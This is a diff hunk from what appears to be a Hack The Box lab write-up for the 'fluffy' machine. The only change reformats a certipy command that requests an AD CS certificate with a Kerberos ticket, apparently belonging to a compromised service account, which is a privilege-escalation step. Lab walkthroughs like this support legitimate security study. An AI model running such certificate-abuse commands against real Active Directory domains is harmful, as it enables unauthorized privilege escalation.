@@ -697,8 +697,5 @@ export KRB5CCNAME=ca_svc.ccache
 ```
 Then request the certificate:
 ```bash
-certipy req \
-    -k -dc-ip '10.10.11.69' \
-    -target 'DC01-fluffy.htb' -ca 'fluffy-DC01-CA' \
-    -template 'User'
+certipy req -k -dc-ip '10.10.11.69' -target 'DC01-fluffy.htb' -ca 'fluffy-DC01-CA'  -template 'User'
 ```
